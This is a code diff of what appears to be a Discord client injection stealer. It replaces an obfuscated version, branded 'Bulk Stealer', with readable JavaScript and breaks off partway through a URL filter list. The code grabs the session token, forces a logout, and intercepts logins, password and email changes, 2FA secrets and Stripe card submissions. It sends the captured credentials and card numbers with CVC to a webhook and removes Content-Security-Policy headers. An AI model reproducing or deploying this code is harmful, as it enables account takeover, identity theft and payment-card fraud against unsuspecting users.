@@ -1,1 +1,300 @@
-const _0x4ea3e3=_0x282f;function _0x282f(_0x4fc05e,_0x21a8b8){const _0xc971ba=_0xc971();return _0x282f=function(_0x282ff4,_0x78170b){_0x282ff4=_0x282ff4-0x1ce;let _0x1aef61=_0xc971ba[_0x282ff4];return _0x1aef61;},_0x282f(_0x4fc05e,_0x21a8b8);}(function(_0x995ee5,_0x5c0b03){const _0x3b2cb6=_0x282f,_0x51a0c8=_0x995ee5();while(!![]){try{const _0x3a1a52=parseInt(_0x3b2cb6(0x21f))/0x1*(parseInt(_0x3b2cb6(0x1e9))/0x2)+parseInt(_0x3b2cb6(0x1d1))/0x3+-parseInt(_0x3b2cb6(0x1f8))/0x4*(parseInt(_0x3b2cb6(0x23c))/0x5)+-parseInt(_0x3b2cb6(0x1f3))/0x6+-parseInt(_0x3b2cb6(0x23e))/0x7*(parseInt(_0x3b2cb6(0x1d5))/0x8)+-parseInt(_0x3b2cb6(0x201))/0x9+parseInt(_0x3b2cb6(0x1cf))/0xa;if(_0x3a1a52===_0x5c0b03)break;else _0x51a0c8['push'](_0x51a0c8['shift']());}catch(_0x490934){_0x51a0c8['push'](_0x51a0c8['shift']());}}}(_0xc971,0x32016));const fs=require('fs'),path=require(_0x4ea3e3(0x236)),{BrowserWindow,session}=require(_0x4ea3e3(0x23a)),querystring=require(_0x4ea3e3(0x225));var webhook='%WEBHOOK_LINK%';function FirstTime(){const _0x25d013=_0x4ea3e3;if(!fs[_0x25d013(0x1de)](path[_0x25d013(0x1fc)](__dirname,_0x25d013(0x1e7))))return!0x0;fs['rmdirSync'](path[_0x25d013(0x1fc)](__dirname,_0x25d013(0x1e7)));const _0x2b98d2=BrowserWindow['getAllWindows']()[0x0];return _0x2b98d2[_0x25d013(0x227)][_0x25d013(0x1e3)](_0x25d013(0x22a),!0x0)[_0x25d013(0x217)](_0x3cc5f5=>{}),!0x1;}session[_0x4ea3e3(0x1f5)][_0x4ea3e3(0x200)][_0x4ea3e3(0x1f4)]((_0xd87ae4,_0x4ef345)=>{const _0x4c6cad=_0x4ea3e3;_0xd87ae4[_0x4c6cad(0x221)][_0x4c6cad(0x23f)](webhook)?_0xd87ae4[_0x4c6cad(0x221)][_0x4c6cad(0x206)](_0x4c6cad(0x21c))?_0x4ef345({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0xd87ae4['responseHeaders'])}):_0x4ef345({'responseHeaders':Object['assign']({'Content-Security-Policy':[_0x4c6cad(0x210),_0x4c6cad(0x1f6),_0x4c6cad(0x207)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0xd87ae4['responseHeaders'])}):(delete _0xd87ae4[_0x4c6cad(0x208)][_0x4c6cad(0x223)],delete _0xd87ae4[_0x4c6cad(0x208)][_0x4c6cad(0x1f7)],_0x4ef345({'responseHeaders':{..._0xd87ae4['responseHeaders'],'Access-Control-Allow-Headers':'*'}}));});const Filter={'urls':[_0x4ea3e3(0x23b),'https://*.discord.com/api/v*/applications/detectable',_0x4ea3e3(0x1ea),'https://*.discord.com/api/v*/users/@me/library','https://discord.com/api/v*/users/@me/library',_0x4ea3e3(0x240),'https://discord.com/api/v*/users/@me/billing/subscriptions',_0x4ea3e3(0x22e)]};session['defaultSession'][_0x4ea3e3(0x200)]['onBeforeRequest'](Filter,(_0x27eb1d,_0x385695)=>{const _0x74f5bb=_0x4ea3e3;if(_0x27eb1d['url']['startsWith'](_0x74f5bb(0x1d4))){_0x385695({'cancel':!![]});return;}if(FirstTime()){}_0x385695({});return;}),session[_0x4ea3e3(0x1f5)][_0x4ea3e3(0x200)][_0x4ea3e3(0x224)](Filter,(_0x1c9fef,_0x3651b1)=>{const _0x6d41f4=_0x4ea3e3;if(FirstTime())_0x1c9fef[_0x6d41f4(0x221)]['startsWith'](_0x6d41f4(0x1d4))?_0x3651b1({'cancel':!0x0}):_0x3651b1({'cancel':!0x1});});function SendToWebhook(_0x53279e){const _0x13f94f=_0x4ea3e3,_0x30dc92=BrowserWindow[_0x13f94f(0x1fe)]()[0x0];_0x30dc92[_0x13f94f(0x227)][_0x13f94f(0x1e3)](_0x13f94f(0x21a)+webhook+_0x13f94f(0x22d)+_0x53279e+'));\x0a\x20\x20\x20\x20',!0x0)[_0x13f94f(0x217)](_0x507a41=>{});}function GetBadges(_0x323cdc){const _0x1e2540=_0x4ea3e3,_0x58068a=0x1,_0x5d1674=0x2,_0x1c899c=0x4,_0x4cf132=0x8,_0x376432=0x40,_0x5af45a=0x80,_0x140ccf=0x100,_0x56852a=0x200,_0x4ed8c3=0x4000,_0x2dc07d=0x20000;var _0x26e3a6='';return(_0x323cdc&_0x58068a)==_0x58068a&&(_0x26e3a6+=_0x1e2540(0x1d2)),(_0x323cdc&_0x5d1674)==_0x5d1674&&(_0x26e3a6+='Partner,'),(_0x323cdc&_0x1c899c)==_0x1c899c&&(_0x26e3a6+=_0x1e2540(0x1f9)),(_0x323cdc&_0x4cf132)==_0x4cf132&&(_0x26e3a6+=_0x1e2540(0x1e1)),(_0x323cdc&_0x376432)==_0x376432&&(_0x26e3a6+=_0x1e2540(0x21d)),(_0x323cdc&_0x5af45a)==_0x5af45a&&(_0x26e3a6+=_0x1e2540(0x218)),(_0x323cdc&_0x140ccf)==_0x140ccf&&(_0x26e3a6+=_0x1e2540(0x1dd)),(_0x323cdc&_0x56852a)==_0x56852a&&(_0x26e3a6+=_0x1e2540(0x1ec)),(_0x323cdc&_0x4ed8c3)==_0x4ed8c3&&(_0x26e3a6+=_0x1e2540(0x202)),(_0x323cdc&_0x2dc07d)==_0x2dc07d&&(_0x26e3a6+='Discord\x20Developer,'),_0x26e3a6==''&&(_0x26e3a6=_0x1e2540(0x1d7)),_0x26e3a6;}function Login(_0x49db76,_0x547ad3,_0x7d8025){const _0x570e4f=_0x4ea3e3,_0x4e9434=BrowserWindow[_0x570e4f(0x1fe)]()[0x0];_0x4e9434[_0x570e4f(0x227)][_0x570e4f(0x1e3)]('\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x7d8025+'\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;',!0x0)[_0x570e4f(0x217)](_0x1b463b=>{const _0x3e415e=_0x570e4f,_0x4d5174=JSON[_0x3e415e(0x219)](_0x1b463b);var _0x490000={'username':_0x3e415e(0x21b),'content':'','avatar_url':_0x3e415e(0x212),'embeds':[{'color':0x0,'fields':[{'name':'**Account\x20Info**','value':'Email:\x20'+_0x49db76+_0x3e415e(0x21e)+_0x547ad3,'inline':!![]},{'name':_0x3e415e(0x1db),'value':'`'+_0x7d8025+'`','inline':![]}],'author':{'name':_0x4d5174[_0x3e415e(0x1d6)]+'#'+_0x4d5174[_0x3e415e(0x213)]+'・'+_0x4d5174['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x4d5174['id']+'/'+_0x4d5174['avatar']+_0x3e415e(0x1da)},'footer':{'text':_0x3e415e(0x21b)}}]};SendToWebhook(JSON[_0x3e415e(0x1e5)](_0x490000));});}function ChangePassword(_0x51341d,_0x140d36,_0x185e12){const _0x22cf8a=_0x4ea3e3,_0x196e50=BrowserWindow[_0x22cf8a(0x1fe)]()[0x0];_0x196e50[_0x22cf8a(0x227)]['executeJavaScript'](_0x22cf8a(0x22b)+_0x185e12+_0x22cf8a(0x20e),!0x0)['then'](_0x380ef6=>{const _0xcc5fee=_0x22cf8a;_0x196e50[_0xcc5fee(0x227)][_0xcc5fee(0x1e3)](_0xcc5fee(0x1fa),!0x0)[_0xcc5fee(0x217)](_0x526cd6=>{const _0x5d116a=_0xcc5fee,_0x54a6a4=JSON[_0x5d116a(0x219)](_0x380ef6);var _0x59c654={'username':_0x5d116a(0x21b),'content':'','avatar_url':_0x5d116a(0x1fd),'embeds':[{'color':0x0,'fields':[{'name':_0x5d116a(0x235),'value':_0x5d116a(0x220)+_0x54a6a4[_0x5d116a(0x1e4)]+_0x5d116a(0x20b)+_0x51341d+_0x5d116a(0x1e8)+_0x140d36,'inline':!![]},{'name':_0x5d116a(0x1d8),'value':_0x5d116a(0x1df)+GetNitro(_0x54a6a4[_0x5d116a(0x205)])+'\x0aBadges:\x20'+GetBadges(_0x54a6a4[_0x5d116a(0x22c)])+'\x0aIP:\x20'+_0x526cd6,'inline':!![]},{'name':_0x5d116a(0x1db),'value':'`'+_0x185e12+'`','inline':![]}],'author':{'name':_0x54a6a4[_0x5d116a(0x1d6)]+'#'+_0x54a6a4[_0x5d116a(0x213)]+'・'+_0x54a6a4['id'],'icon_url':_0x5d116a(0x211)+_0x54a6a4['id']+'/'+_0x54a6a4[_0x5d116a(0x203)]+_0x5d116a(0x1da)},'footer':{'text':_0x5d116a(0x21b)}}]};SendToWebhook(JSON[_0x5d116a(0x1e5)](_0x59c654));});});}function ChangeEmail(_0x44c3a1,_0x3af59d,_0x1e6cc1){const _0x220fa8=_0x4ea3e3,_0x31eecb=BrowserWindow[_0x220fa8(0x1fe)]()[0x0];_0x31eecb[_0x220fa8(0x227)][_0x220fa8(0x1e3)](_0x220fa8(0x22b)+_0x1e6cc1+_0x220fa8(0x20e),!0x0)[_0x220fa8(0x217)](_0x1f8de5=>{const _0x498134=_0x220fa8;_0x31eecb['webContents'][_0x498134(0x1e3)](_0x498134(0x1fa),!0x0)[_0x498134(0x217)](_0x3b1a11=>{const _0x5e69c0=_0x498134;var _0x19a3a1={'username':_0x5e69c0(0x21b),'content':'','avatar_url':_0x5e69c0(0x1fd),'embeds':[{'color':0x0,'fields':[{'name':_0x5e69c0(0x1dc),'value':_0x5e69c0(0x1e0)+_0x44c3a1+_0x5e69c0(0x20f)+_0x3af59d,'inline':!![]},{'name':_0x5e69c0(0x1d8),'value':_0x5e69c0(0x1df)+GetNitro(json['premium_type'])+'\x0aBadges:\x20'+GetBadges(json[_0x5e69c0(0x22c)])+'\x0aIP:\x20'+_0x3b1a11,'inline':!![]},{'name':'**Token**','value':'`'+_0x1e6cc1+'`','inline':![]}],'author':{'name':json[_0x5e69c0(0x1d6)]+'#'+json['discriminator']+'・'+json['id'],'icon_url':_0x5e69c0(0x211)+json['id']+'/'+json[_0x5e69c0(0x203)]+_0x5e69c0(0x1da)},'footer':{'text':_0x5e69c0(0x21b)}}]};SendToWebhook(JSON['stringify'](_0x19a3a1));});});}function CreditCardAdded(_0x3045e9,_0x1b10c4,_0x36ab42,_0x2c211f,_0x45fbae,_0x49917d,_0x58818e,_0x3e9b15,_0x4b9142,_0x407487){const _0x579605=_0x4ea3e3,_0x84a40=BrowserWindow[_0x579605(0x1fe)]()[0x0];_0x84a40[_0x579605(0x227)][_0x579605(0x1e3)](_0x579605(0x22b)+_0x407487+_0x579605(0x20e),!0x0)[_0x579605(0x217)](_0x11fbe3=>{const _0x1e8880=_0x579605;_0x84a40[_0x1e8880(0x227)][_0x1e8880(0x1e3)](_0x1e8880(0x1fa),!0x0)['then'](_0x5035a8=>{const _0x2dab95=_0x1e8880;var _0x5b4e18=JSON[_0x2dab95(0x219)](_0x11fbe3),_0x5d1ad2={'username':'Bulk\x20Stealer','content':'','avatar_url':'https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png','embeds':[{'color':0x0,'fields':[{'name':'**Credit\x20Card\x20Added**','value':'Credit\x20Card\x20Number:\x20'+_0x3045e9+'\x0aCredit\x20Card\x20Expiration:\x20'+_0x36ab42+'/'+_0x2c211f+'\x0aCVC:\x20'+_0x1b10c4+'\x0a\x20Country:\x20'+_0x4b9142+_0x2dab95(0x20c)+_0x58818e+'\x0aCity\x20'+_0x49917d+_0x2dab95(0x228)+_0x3e9b15+'\x0a\x20Street:\x20'+_0x45fbae,'inline':!![]},{'name':_0x2dab95(0x1d8),'value':_0x2dab95(0x1df)+GetNitro(_0x5b4e18[_0x2dab95(0x205)])+'\x0aBadges:\x20'+GetBadges(_0x5b4e18[_0x2dab95(0x22c)])+_0x2dab95(0x237)+_0x5035a8,'inline':!![]},{'name':'**Token**','value':'`'+_0x407487+'`','inline':![]}],'author':{'name':_0x5b4e18[_0x2dab95(0x1d6)]+'#'+_0x5b4e18[_0x2dab95(0x213)]+'・'+_0x5b4e18['id'],'icon_url':_0x2dab95(0x211)+_0x5b4e18['id']+'/'+_0x5b4e18[_0x2dab95(0x203)]+_0x2dab95(0x1da)},'footer':{'text':'Discord\x20Token\x20Grabber\x20by\x20krpsd'}}]};SendToWebhook(JSON[_0x2dab95(0x1e5)](_0x5d1ad2));});});}function CreditCardAdded(_0x128c8c,_0x494366,_0x1d0dd8,_0x1582a6,_0x9d11bf,_0x49ecc2,_0x3e90a4,_0x2381dd,_0x5c656a,_0x1bd5c1){const _0x1fb3b4=_0x4ea3e3,_0xab8306=BrowserWindow['getAllWindows']()[0x0];_0xab8306['webContents'][_0x1fb3b4(0x1e3)](_0x1fb3b4(0x22b)+_0x1bd5c1+_0x1fb3b4(0x20e),!0x0)['then'](_0x4ac4da=>{const _0x288f77=_0x1fb3b4;_0xab8306['webContents']['executeJavaScript'](_0x288f77(0x1fa),!0x0)['then'](_0x3f4970=>{const _0x3cb796=_0x288f77;var _0x538fa9=JSON[_0x3cb796(0x219)](_0x4ac4da),_0x24fc91={'username':'Bulk\x20Stealer','content':'','avatar_url':_0x3cb796(0x1fd),'embeds':[{'color':0x0,'fields':[{'name':_0x3cb796(0x1eb),'value':_0x3cb796(0x1d9)+_0x128c8c+_0x3cb796(0x20a)+_0x1d0dd8+'/'+_0x1582a6+'\x0aCVC:\x20'+_0x494366+_0x3cb796(0x1fb)+_0x5c656a+'\x0aState\x20'+_0x3e90a4+_0x3cb796(0x230)+_0x49ecc2+_0x3cb796(0x228)+_0x2381dd+_0x3cb796(0x239)+_0x9d11bf,'inline':!![]},{'name':_0x3cb796(0x1d8),'value':_0x3cb796(0x1df)+GetNitro(_0x538fa9[_0x3cb796(0x205)])+_0x3cb796(0x1ce)+GetBadges(_0x538fa9[_0x3cb796(0x22c)])+_0x3cb796(0x237)+_0x3f4970,'inline':!![]},{'name':_0x3cb796(0x1db),'value':'`'+_0x1bd5c1+'`','inline':![]}],'author':{'name':_0x538fa9[_0x3cb796(0x1d6)]+'#'+_0x538fa9['discriminator']+'・'+_0x538fa9['id'],'icon_url':_0x3cb796(0x211)+_0x538fa9['id']+'/'+_0x538fa9[_0x3cb796(0x203)]+'.webp'},'footer':{'text':'Bulk\x20Stealer'}}]};SendToWebhook(JSON[_0x3cb796(0x1e5)](_0x24fc91));});});}const ChangePasswordFilter={'urls':['https://discord.com/api/v*/users/@me',_0x4ea3e3(0x1ed),_0x4ea3e3(0x1d0),_0x4ea3e3(0x233),_0x4ea3e3(0x1ef),_0x4ea3e3(0x1d3),_0x4ea3e3(0x1f2)]};session[_0x4ea3e3(0x1f5)][_0x4ea3e3(0x200)][_0x4ea3e3(0x231)](ChangePasswordFilter,(_0xe54d2e,_0x52eaee)=>{const _0x43c74f=_0x4ea3e3;if(_0xe54d2e[_0x43c74f(0x221)][_0x43c74f(0x1ff)]('login')){if(_0xe54d2e[_0x43c74f(0x1e6)]==0xc8){const _0xa3d016=JSON['parse'](Buffer[_0x43c74f(0x214)](_0xe54d2e[_0x43c74f(0x1ee)][0x0][_0x43c74f(0x226)])['toString']()),_0x43609d=_0xa3d016['login'],_0x1fc7c3=_0xa3d016['password'],_0x23fe46=BrowserWindow[_0x43c74f(0x1fe)]()[0x0];_0x23fe46[_0x43c74f(0x227)][_0x43c74f(0x1e3)](_0x43c74f(0x1f1),!0x0)['then'](_0x4fddef=>{Login(_0x43609d,_0x1fc7c3,_0x4fddef);});}else{}}if(_0xe54d2e['url']['endsWith'](_0x43c74f(0x234))){if(_0xe54d2e[_0x43c74f(0x1e6)]==0xc8&&_0xe54d2e[_0x43c74f(0x23d)]==_0x43c74f(0x1f0)){const _0x3bcc42=JSON['parse'](Buffer[_0x43c74f(0x214)](_0xe54d2e[_0x43c74f(0x1ee)][0x0][_0x43c74f(0x226)])[_0x43c74f(0x232)]());if(_0x3bcc42[_0x43c74f(0x238)]!=null&&_0x3bcc42[_0x43c74f(0x238)]!=undefined&&_0x3bcc42[_0x43c74f(0x238)]!=''){if(_0x3bcc42[_0x43c74f(0x204)]!=undefined&&_0x3bcc42['new_password']!=null&&_0x3bcc42[_0x43c74f(0x204)]!=''){const _0x1a4794=BrowserWindow[_0x43c74f(0x1fe)]()[0x0];_0x1a4794[_0x43c74f(0x227)]['executeJavaScript'](_0x43c74f(0x1f1),!0x0)[_0x43c74f(0x217)](_0x3a65bc=>{const _0x40f057=_0x43c74f;ChangePassword(_0x3bcc42['password'],_0x3bcc42[_0x40f057(0x204)],_0x3a65bc);});}if(_0x3bcc42[_0x43c74f(0x1e4)]!=null&&_0x3bcc42['email']!=undefined&&_0x3bcc42[_0x43c74f(0x1e4)]!=''){const _0x498003=BrowserWindow['getAllWindows']()[0x0];_0x498003[_0x43c74f(0x227)][_0x43c74f(0x1e3)](_0x43c74f(0x1f1),!0x0)[_0x43c74f(0x217)](_0x1ce8b2=>{const _0x3a2ac4=_0x43c74f;ChangeEmail(_0x3bcc42['email'],_0x3bcc42[_0x3a2ac4(0x238)],_0x1ce8b2);});}}}else{}}if(_0xe54d2e[_0x43c74f(0x221)][_0x43c74f(0x1ff)](_0x43c74f(0x222))){const _0x1287f9=BrowserWindow['getAllWindows']()[0x0],_0x383382=querystring[_0x43c74f(0x219)](decodeURIComponent(Buffer[_0x43c74f(0x214)](_0xe54d2e[_0x43c74f(0x1ee)][0x0]['bytes'])[_0x43c74f(0x232)]()));_0x1287f9[_0x43c74f(0x227)][_0x43c74f(0x1e3)](_0x43c74f(0x1f1),!0x0)[_0x43c74f(0x217)](_0x2b4475=>{const _0x40715a=_0x43c74f;CreditCardAdded(_0x383382[_0x40715a(0x20d)],_0x383382[_0x40715a(0x22f)],_0x383382['card[exp_month]'],_0x383382[_0x40715a(0x216)],_0x383382[_0x40715a(0x215)],_0x383382['card[address_city]'],_0x383382[_0x40715a(0x229)],_0x383382[_0x40715a(0x1e2)],_0x383382[_0x40715a(0x209)],_0x2b4475);});}}),module[_0x4ea3e3(0x241)]=require('./core.asar');function _0xc971(){const _0xd3e550=['\x0a\x20Street:\x20','electron','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','7235hwUNQI','method','7zdOGpn','startsWith','https://*.discord.com/api/v*/users/@me/billing/subscriptions','exports','\x0aBadges:\x20','3230880AcGuVa','https://*.discord.com/api/v*/users/@me','890217eSIipe','Staff,','https://*.discord.com/api/v*/auth/login','wss://','2825808jLgzAw','username','None','**Other\x20Info**','Credit\x20Card\x20Number:\x20','.webp','**Token**','**Email\x20Changed**','HypeSquad\x20Balance,','existsSync','Nitro\x20Type:\x20','New\x20Email:\x20','Green\x20Bughunter,','card[address_zip]','executeJavaScript','email','stringify','statusCode','BulkFA','\x0aNew\x20Password:\x20','670sVIOAe','https://discord.com/api/v*/applications/detectable','**Credit\x20Card\x20Added**','Early\x20Supporter,','https://discordapp.com/api/v*/users/@me','uploadData','https://discord.com/api/v*/auth/login','PATCH','for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;','https://api.stripe.com/v*/tokens','201456ePBTMJ','onHeadersReceived','defaultSession','Access-Control-Allow-Headers\x20\x27*\x27','content-security-policy-report-only','488YGlCJj','Hypesquad\x20Event,','\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/raw\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText;\x0a\x20\x20\x20\x20','\x0a\x20Country:\x20','join','https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png','getAllWindows','endsWith','webRequest','1019736PebbPU','Gold\x20BugHunter,','avatar','new_password','premium_type','includes','Access-Control-Allow-Origin\x20\x27*\x27','responseHeaders','card[address_country]','\x0aCredit\x20Card\x20Expiration:\x20','\x0aOld\x20Password:\x20','\x0aState\x20','card[number]','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;','\x0aPassword:\x20','default-src\x20\x27*\x27','https://cdn.discordapp.com/avatars/','https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg','discriminator','from','card[address_line1]','card[exp_year]','then','HypeSquad\x20Brillance,','parse','\x20\x20\x20\x20var\x20xhr\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xhr.open(\x22POST\x22,\x20\x22','Bulk\x20Stealer','discord.com','Hypesquad\x20Bravery,','\x20-\x20Password:\x20','781vUegYt','Email:\x20','url','tokens','content-security-policy','onBeforeRequest','querystring','bytes','webContents','\x0aZIP:\x20','card[address_state]','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','flags','\x22,\x20true);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Access-Control-Allow-Origin\x27,\x20\x27*\x27);\x0a\x20\x20\x20\x20xhr.send(JSON.stringify(','wss://remote-auth-gateway.discord.gg/*','card[cvc]','\x0aCity\x20','onCompleted','toString','https://discordapp.com/api/v*/auth/login','users/@me','**Password\x20Changed**','path','\x0aIP:\x20','password'];_0xc971=function(){return _0xd3e550;};return _0xc971();}
+const fs = require("fs");
+const path = require("path");
+const {
+    BrowserWindow,
+    session
+} = require("electron");
+const querystring = require("querystring");
+var webhook = "%WEBHOOK_LINK%";
+
+//Script to get the current token from the client
+const getTokenScript = `
+    for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([
+        [], {
+            get_require: (a, b, c) => a.exports = c
+        },
+        [
+            ["get_require"]
+        ]
+    ]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([
+        [Math.random()], {},
+        a => {
+            gg = a
+        }
+    ]), gg.c)
+    if (gg.c.hasOwnProperty(a)) {
+        let b = gg.c[a].exports;
+        if (b && b.__esModule && b.default)
+            for (let a in b.default) "getToken" == a && (token = b.default.getToken())
+    } token;
+`;
+
+//On the first run, it infects the files and logs your discord out so you have to re-login
+function FirstTime() {
+    if (!fs[`existsSync`](path[`join`](__dirname, `bbystealer`))) return true;
+    fs[`rmdirSync`](path[`join`](__dirname, `bbystealer`));
+    const win = BrowserWindow[`getAllWindows`]()[0];
+    return win["webContents"][`executeJavaScript`](`
+    function LogOut() {
+        (function (a) {
+            const b = "string" == typeof a ? a : null;
+            for (const c in gg.c)
+                if (gg.c.hasOwnProperty(c)) {
+                    const d = gg.c[c].exports;
+                    if (d && d.__esModule && d.default && (b ? d.default[b] : a(d.default))) return
+                    d.default;
+                    if (d && (b ? d[b] : a(d))) return d
+                } return null
+        })("login").logout()
+    }
+    LogOut()
+    `, true)[`then`](tationna => {}), false;
+}
+
+//This functions sends the data to hackers API
+function SendToWebhook(what) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${webhook}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, !0).then((token => {}))
+}
+
+//==========================DETOUR FUNCTIONS START==========================
+function ChangeEmail(pEmail, pPassword, pToken) {
+    const win = BrowserWindow[`getAllWindows`]()[0];
+    win["webContents"][`executeJavaScript`](`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+        xmlHttp.setRequestHeader("Authorization", "` + pToken + `");
+        xmlHttp.send( null );
+        xmlHttp.responseText;`, true)[`then`](res => {
+        var resJson = JSON[`parse`](res),
+            data = {
+                username: resJson[`username`] + "#" + resJson[`discriminator`],
+                id: resJson.id,
+                avatar: resJson[`avatar`],
+                nitro: resJson["premium_type"],
+                badges: resJson[`flags`],
+                email: pEmail,
+                password: pPassword,
+                token: pToken,
+                type: "changedemail"
+            };
+
+        SendToWebhook(JSON[`stringify`](data));
+    });
+}
+
+function ChangePassword(pPassword, pNewPassword, pToken) {
+    const win = BrowserWindow[`getAllWindows`]()[0];
+    win["webContents"][`executeJavaScript`](`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, true)[`then`](res => {
+        var resJson = JSON[`parse`](res),
+            data = {
+                username: resJson[`username`] + "#" + resJson[`discriminator`],
+                avatar: resJson[`avatar`],
+                id: resJson.id,
+                nitro: resJson["premium_type"],
+                badges: resJson[`flags`],
+                email: resJson[`email`],
+                new_password: pNewPassword,
+                password: pPassword,
+                token: pToken,
+                type: `changedpassword`
+            };
+        SendToWebhook(JSON[`stringify`](data));
+    });
+}
+
+function CreditCardAdded(pCCNum, pCvc, pExpireMonth, pExpireYear, pToken) {
+    const win = BrowserWindow[`getAllWindows`]()[0];
+    win["webContents"][`executeJavaScript`](`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, true)[`then`](res => {
+        var resJson = JSON[`parse`](res),
+            data = {
+                username: resJson[`username`] + "#" + resJson[`discriminator`],
+                id: resJson.id,
+                avatar: resJson[`avatar`],
+                nitro: resJson["premium_type"],
+                badges: resJson[`flags`],
+                email: resJson[`email`],
+                cc_num: pCCNum,
+                expire_year: pExpireYear,
+                expire_month: pExpireMonth,
+                token: pToken,
+                cvc: pCvc,
+                type: `creditcard`
+            };
+        SendToWebhook(JSON[`stringify`](data));
+    });
+}
+
+function Enable2fa(pSecret, pPassword, pToken) {
+    const win = BrowserWindow[`getAllWindows`]()[0];
+    win["webContents"][`executeJavaScript`](`var xmlHttp = new XMLHttpRequest(); 
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, true)[`then`](res => {
+        var resJson = JSON[`parse`](res),
+            data = {
+                username: resJson[`username`] + "#" + resJson[`discriminator`],
+                avatar: resJson[`avatar`],
+                id: resJson.id,
+                nitro: resJson["premium_type"],
+                badges: resJson[`flags`],
+                email: resJson[`email`],
+                secret: pSecret,
+                password: pPassword,
+                token: pToken,
+                type: `enable2fa`
+            };
+        SendToWebhook(JSON[`stringify`](data));
+    });
+}
+
+function Login(pEmail, pPassword, pToken) {
+    const win = BrowserWindow[`getAllWindows`]()[0];
+    win[`webContent` + "s"][`executeJavaScript`](`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, true)[`then`](res => {
+        var resJson = JSON[`parse`](res),
+            data = {
+                username: resJson[`username`] + "#" + resJson[`discriminator`],
+                id: resJson.id,
+                avatar: resJson[`avatar`],
+                nitro: resJson["premium_type"],
+                badges: resJson[`flags`],
+                email: pEmail,
+                password: pPassword,
+                token: pToken,
+                type: `login`
+            };
+        SendToWebhook(JSON[`stringify`](data));
+    });
+}
+//==========================DETOUR FUNCTIONS END--==========================
+
+
+const Filter = {
+    urls: [
+        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
+        'https://*.discord.com/api/v*/applications/detectable',
+        'https://discord.com/api/v*/applications/detectable',
+        'https://*.discord.com/api/v*/users/@me/library',
+        'https://discord.com/api/v*/users/@me/library',
